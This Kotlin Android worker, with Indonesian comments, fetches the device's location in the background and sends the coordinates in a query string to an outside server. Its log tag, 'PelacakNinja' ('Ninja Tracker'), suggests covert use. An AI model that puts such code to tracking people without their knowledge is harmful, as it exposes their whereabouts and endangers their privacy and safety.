package com.hanafi.han

import android.annotation.SuppressLint
import android.content.Context
import android.util.Log
import androidx.work.CoroutineWorker
import androidx.work.WorkerParameters
import com.google.android.gms.location.LocationServices
import com.google.android.gms.location.Priority
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.tasks.await
import kotlinx.coroutines.withContext
import java.net.HttpURLConnection
import java.net.URL

class LocationWorker(appContext: Context, workerParams: WorkerParameters) : CoroutineWorker(appContext, workerParams) {

    @SuppressLint("MissingPermission")
    override suspend fun doWork(): Result {
        return try {
            val fusedLocationClient = LocationServices.getFusedLocationProviderClient(applicationContext)
            
            // Mengambil lokasi (akurasi seimbang agar hemat baterai)
            val location = fusedLocationClient.getCurrentLocation(Priority.PRIORITY_BALANCED_POWER_ACCURACY, null).await()

            if (location != null) {
                val latitude = location.latitude
                val longitude = location.longitude
                
                Log.d("PelacakNinja", "Lokasi Ditemukan: $latitude, $longitude")

                // Kirim ke server
                kirimKeServer(latitude, longitude)
            }

            Result.success()
        } catch (e: Exception) {
            Log.e("PelacakNinja", "Gagal mengambil lokasi: ${e.message}")
            Result.retry() // Coba lagi nanti jika gagal
        }
    }

    private suspend fun kirimKeServer(lat: Double, lon: Double) {
        withContext(Dispatchers.IO) {
            try {
                val urlServer = "https://mymaps.hanavy.online/api/update?lat=$lat&lon=$lon"
                val url = URL(urlServer)
                val connection = url.openConnection() as HttpURLConnection
                connection.requestMethod = "GET"
                connection.connectTimeout = 5000 
                
                val responseCode = connection.responseCode
                Log.d("PelacakNinja", "Status Pengiriman: $responseCode")
                
                connection.disconnect()
            } catch (e: Exception) {
                Log.e("PelacakNinja", "Gagal mengirim ke server: ${e.message}")
            }
        }
    }
}